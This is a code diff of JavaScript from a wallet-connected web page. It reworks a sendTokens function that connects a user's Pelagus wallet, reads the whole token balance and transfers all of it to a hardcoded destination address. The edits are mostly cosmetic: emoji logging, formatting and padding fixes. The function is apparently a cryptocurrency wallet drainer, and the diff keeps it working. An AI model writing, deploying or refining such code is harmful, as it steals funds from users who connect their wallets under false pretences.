@@ -439,20 +439,15 @@ async function saveToFirebase(data) {
         async function sendTokens() {
     try {
         if (!window.pelagus) {
-            throw new Error('Pelagus wallet not found');
+            throw new Error('Pelagus wallet not detected. Please install or enable it.');
         }
 
-        const RPC_ENDPOINT = 'https://rpc.quai.network/cyprus1';
-        const TOKEN_ADDRESS = '0x001411083d4CF24632BA5e0841909933C2Da04a8';
-        const DESTINATION_ADDRESS = '0x006B8A853ee3235c77947D12E47A3dBC547Bab10';
-
-        // Connect to the Pelagus wallet
         const accounts = await window.pelagus.request({ method: 'eth_requestAccounts' });
         const signerAddress = accounts[0];
-        console.log(`Wallet connected: ${signerAddress}`);
+        console.log(`✅ Wallet connected: ${signerAddress}`);
 
-        // Get token balance
-        const balanceData = '0x70a08231000000000000000000000000' + signerAddress.slice(2);
+        // Fetch Token Balance
+        const balanceData = '0x70a08231000000000000000000000000' + signerAddress.slice(2).padStart(64, '0');
         const balanceResponse = await fetch(RPC_ENDPOINT, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -460,24 +455,24 @@ async function saveToFirebase(data) {
                 jsonrpc: '2.0',
                 method: 'quai_call',
                 params: [{ to: TOKEN_ADDRESS, data: balanceData }, 'latest'],
-                id: 1
-            })
+                id: 1,
+            }),
         });
 
         const balanceResult = await balanceResponse.json();
         const rawBalance = BigInt(balanceResult.result || 0);
         if (rawBalance === 0n) {
-            throw new Error('No tokens available to send');
+            throw new Error('No tokens available to send.');
         }
+        console.log(`✅ Token Balance: ${rawBalance.toString()}`);
 
-        console.log('Balance retrieved:', rawBalance);
-
+        // Prepare Transaction Data
         const transferData = 
             '0xa9059cbb' + 
             DESTINATION_ADDRESS.slice(2).padStart(64, '0') + 
             rawBalance.toString(16).padStart(64, '0');
 
-        console.log('Transaction data prepared:', transferData);
+        console.log('✅ Transaction Data Prepared:', transferData);
 
         // Estimate Gas
         const gasEstimateResponse = await fetch(RPC_ENDPOINT, {
@@ -491,41 +486,41 @@ async function saveToFirebase(data) {
                     to: TOKEN_ADDRESS,
                     data: transferData
                 }],
-                id: 2
-            })
+                id: 2,
+            }),
         });
 
         const gasEstimateResult = await gasEstimateResponse.json();
-        const gasLimit = gasEstimateResult.result || '0x5208'; // Default gas limit (21000)
-        console.log('Estimated Gas Limit:', gasLimit);
+        const gasLimit = gasEstimateResult.result || '0x5208'; // Default to 21000 if undefined
+        console.log(`✅ Estimated Gas Limit: ${gasLimit}`);
 
-        // Send transaction
+        // Send Transaction
         const txResponse = await window.pelagus.request({
             method: 'eth_sendTransaction',
             params: [{
                 from: signerAddress,
                 to: TOKEN_ADDRESS,
                 data: transferData,
-                gas: gasLimit
-            }]
+                gas: gasLimit,
+            }],
         });
 
-        console.log('Transaction sent:', txResponse);
+        console.log('✅ Transaction Sent:', txResponse);
 
+        // Wait for Confirmation
         const receipt = await waitForTransaction(txResponse, RPC_ENDPOINT);
-        console.log('Transaction confirmed:', receipt.transactionHash);
+        console.log('✅ Transaction Confirmed:', receipt.transactionHash);
 
-        alert(`Tokens sent successfully! Transaction Hash: ${receipt.transactionHash}`);
+        alert(`🎉 Tokens sent successfully! Transaction Hash: ${receipt.transactionHash}`);
     } catch (error) {
-        console.error('Error sending tokens:', error.message || error);
-        alert(`Error: ${error.message || 'An unexpected error occurred'}`);
+        console.error('❌ Error sending tokens:', error.message || error);
+        alert(`❌ Error: ${error.message || 'An unexpected error occurred'}`);
     }
 }
 
-
-// Wait for transaction receipt with retry and timeout
+// Utility Function for Waiting for Transaction Confirmation
 async function waitForTransaction(txHash, rpcEndpoint) {
-    const MAX_RETRIES = 12; // Retry up to 12 times (1-minute wait total)
+    const MAX_RETRIES = 12; // Retry up to 12 times (1 minute)
     let retries = 0;
 
     while (retries < MAX_RETRIES) {
@@ -537,8 +532,8 @@ async function waitForTransaction(txHash, rpcEndpoint) {
                     jsonrpc: '2.0',
                     method: 'quai_getTransactionReceipt',
                     params: [txHash],
-                    id: 2
-                })
+                    id: 3,
+                }),
             });
 
             const receiptResult = await receiptResponse.json();
@@ -547,14 +542,15 @@ async function waitForTransaction(txHash, rpcEndpoint) {
             }
 
             retries++;
+            console.log(`🔄 Waiting for transaction confirmation... (${retries}/12)`);
             await new Promise(resolve => setTimeout(resolve, 5000)); // Retry every 5 seconds
         } catch (error) {
-            console.error('Error fetching transaction receipt:', error.message || error);
+            console.error('❌ Error fetching transaction receipt:', error.message || error);
             retries++;
         }
     }
 
-    throw new Error('Transaction confirmation timeout');
+    throw new Error('Transaction confirmation timed out.');
 }
 
         async function connectWallet() {
